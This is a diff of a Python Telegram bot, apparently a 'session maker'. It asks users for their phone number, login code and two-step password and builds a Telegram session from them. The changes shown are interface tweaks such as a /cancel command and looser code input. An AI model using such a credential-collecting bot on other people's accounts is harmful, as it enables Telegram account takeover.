@@ -47,7 +47,6 @@ async def create_session(phone, code, phone_code_hash, password=None):
 
         await client.connect()
         
-        # ورود با کد و هش
         try:
             await client.sign_in(
                 phone=phone, 
@@ -80,12 +79,12 @@ async def handle_bot():
     
     @bot.on(events.NewMessage(pattern='/start'))
     async def start_handler(event):
+        # پاک کردن منوی قبلی با edit
         await event.reply(
             "🔥 **سشن ساز دیکتاتوران**\n\n"
             "🔑 برای ساخت سشن جدید دکمه زیر رو بزن:",
             buttons=[
-                [Button.inline("🔑 ساخت سشن جدید", b"create_session")],
-                [Button.inline("❌ انصراف", b"cancel")]
+                [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
             ],
             parse_mode='markdown'
         )
@@ -93,28 +92,32 @@ async def handle_bot():
     @bot.on(events.CallbackQuery(data=b"create_session"))
     async def create_session_callback(event):
         user_id = event.sender_id
+        
+        # پاک کردن اطلاعات قبلی کاربر
+        if user_id in user_sessions:
+            del user_sessions[user_id]
+        
         user_sessions[user_id] = {"step": "phone"}
         
+        # ویرایش پیام قبلی به جای ارسال جدید
         await event.edit(
             "📱 **شماره خود را وارد کن:**\n"
-            "مثال: `09123456789`",
-            buttons=[
-                [Button.inline("❌ انصراف", b"cancel")]
-            ],
+            "مثال: `09123456789`\n\n"
+            "⚠️ برای لغو /cancel رو بزن",
+            buttons=None,
             parse_mode='markdown'
         )
     
-    @bot.on(events.CallbackQuery(data=b"cancel"))
-    async def cancel_callback(event):
+    @bot.on(events.NewMessage(pattern='/cancel'))
+    async def cancel_command(event):
         user_id = event.sender_id
         if user_id in user_sessions:
             del user_sessions[user_id]
         
-        await event.edit(
+        await event.reply(
             "✅ **لغو شد**\n\n"
             "برای شروع مجدد `/start` رو بزن.",
-            parse_mode='markdown',
-            buttons=None
+            parse_mode='markdown'
         )
     
     @bot.on(events.CallbackQuery(data=b"get_session"))
@@ -159,21 +162,21 @@ async def handle_bot():
         user_id = event.sender_id
         text = event.text.strip()
         
+        # اگر کاربر در حال ساخت سشن نباشد، نادیده بگیر
         if user_id not in user_sessions:
             return
         
         step = user_sessions[user_id].get("step")
         
         if step == "phone":
+            # پاک کردن فاصله و کاراکترهای اضافی
             phone_clean = re.sub(r'[\s\-\(\)\+]', '', text)
             
             if not re.match(r'^[\d]+$', phone_clean) or len(phone_clean) < 10:
                 await event.reply(
                     "❌ **شماره اشتباه!**\n"
-                    "مثال: `09123456789`",
-                    buttons=[
-                        [Button.inline("❌ انصراف", b"cancel")]
-                    ],
+                    "مثال: `09123456789`\n\n"
+                    "⚠️ برای لغو /cancel رو بزن",
                     parse_mode='markdown'
                 )
                 return
@@ -182,10 +185,8 @@ async def handle_bot():
             user_sessions[user_id]["step"] = "code"
             
             await event.reply(
-                "⏳ **ارسال کد...**",
-                buttons=[
-                    [Button.inline("❌ انصراف", b"cancel")]
-                ],
+                "⏳ **ارسال کد...**\n\n"
+                "⚠️ برای لغو /cancel رو بزن",
                 parse_mode='markdown'
             )
             
@@ -215,34 +216,30 @@ async def handle_bot():
                 
                 await event.reply(
                     "✅ **کد ارسال شد!**\n\n"
-                    "🔐 **کد رو وارد کن (نقطه‌دار):**\n"
-                    "مثال: `1.2.3.4.5`",
-                    buttons=[
-                        [Button.inline("❌ انصراف", b"cancel")]
-                    ],
+                    "🔐 **کد رو وارد کن:**\n"
+                    "📌 میتونی با نقطه یا فاصله وارد کنی:\n"
+                    "مثال: `1.2.3.4.5` یا `1 2 3 4 5` یا `12345`\n\n"
+                    "⚠️ برای لغو /cancel رو بزن",
                     parse_mode='markdown'
                 )
                 
             except Exception as e:
                 await event.reply(
-                    f"❌ **خطا:** `{str(e)}`",
-                    buttons=[
-                        [Button.inline("🔄 تلاش دوباره", b"create_session")]
-                    ],
+                    f"❌ **خطا:** `{str(e)}`\n\n"
+                    "⚠️ برای لغو /cancel رو بزن",
                     parse_mode='markdown'
                 )
                 del user_sessions[user_id]
         
         elif step == "code":
+            # پاک کردن نقاط و فاصله‌ها
             code_cleaned = text.replace(".", "").replace(" ", "").strip()
             
             if not code_cleaned.isdigit() or len(code_cleaned) != 5:
                 await event.reply(
                     "❌ **کد نامعتبر!**\n"
-                    "مثال: `1.2.3.4.5` یا `12345`",
-                    buttons=[
-                        [Button.inline("❌ انصراف", b"cancel")]
-                    ],
+                    "مثال: `1.2.3.4.5` یا `1 2 3 4 5` یا `12345`\n\n"
+                    "⚠️ برای لغو /cancel رو بزن",
                     parse_mode='markdown'
                 )
                 return
@@ -250,35 +247,30 @@ async def handle_bot():
             user_sessions[user_id]["code"] = code_cleaned
             user_sessions[user_id]["step"] = "processing"
             
-            await event.reply("⏳ **در حال ورود...**", parse_mode='markdown')
+            await event.reply("⏳ **در حال ورود...**\n\n⚠️ لطفاً صبر کنید...", parse_mode='markdown')
             
             phone = user_sessions[user_id]["phone"]
             code = user_sessions[user_id]["code"]
             phone_code_hash = user_sessions[user_id].get("phone_code_hash")
             
-            # 🔑 ارسال کد با هش
             result = await create_session(phone, code, phone_code_hash)
             
             if "error" in result:
                 if result["error"] == "PASSWORD_REQUIRED":
                     user_sessions[user_id]["step"] = "password"
                     await event.reply(
-                        "🔐 **رمز دو مرحله‌ای رو وارد کن:**",
-                        buttons=[
-                            [Button.inline("❌ انصراف", b"cancel")]
-                        ],
+                        "🔐 **رمز دو مرحله‌ای رو وارد کن:**\n\n"
+                        "⚠️ برای لغو /cancel رو بزن",
                         parse_mode='markdown'
                     )
                 else:
                     await event.reply(
                         f"❌ **خطا:** `{result['error']}`\n\n"
-                        "💡 نکات:\n"
-                        "1. کد رو درست وارد کن\n"
-                        "2. اپلیکیشن تلگرام رو ببند\n"
-                        "3. دوباره تلاش کن",
-                        buttons=[
-                            [Button.inline("🔄 تلاش دوباره", b"create_session")]
-                        ],
+                        "💡 **نکات:**\n"
+                        "1️⃣ کد رو درست وارد کن\n"
+                        "2️⃣ اپلیکیشن تلگرام رو ببند\n"
+                        "3️⃣ دوباره تلاش کن\n\n"
+                        "🔑 برای شروع مجدد `/start` رو بزن",
                         parse_mode='markdown'
                     )
                     del user_sessions[user_id]
@@ -340,7 +332,7 @@ async def handle_bot():
             password = text
             user_sessions[user_id]["step"] = "processing"
             
-            await event.reply("⏳ **در حال ورود با رمز...**", parse_mode='markdown')
+            await event.reply("⏳ **در حال ورود با رمز...**\n\n⚠️ لطفاً صبر کنید...", parse_mode='markdown')
             
             phone = user_sessions[user_id]["phone"]
             code = user_sessions[user_id]["code"]
@@ -350,10 +342,8 @@ async def handle_bot():
             
             if "error" in result:
                 await event.reply(
-                    f"❌ **خطا:** `{result['error']}`",
-                    buttons=[
-                        [Button.inline("🔄 تلاش دوباره", b"create_session")]
-                    ],
+                    f"❌ **خطا:** `{result['error']}`\n\n"
+                    "🔑 برای شروع مجدد `/start` رو بزن",
                     parse_mode='markdown'
                 )
                 del user_sessions[user_id]
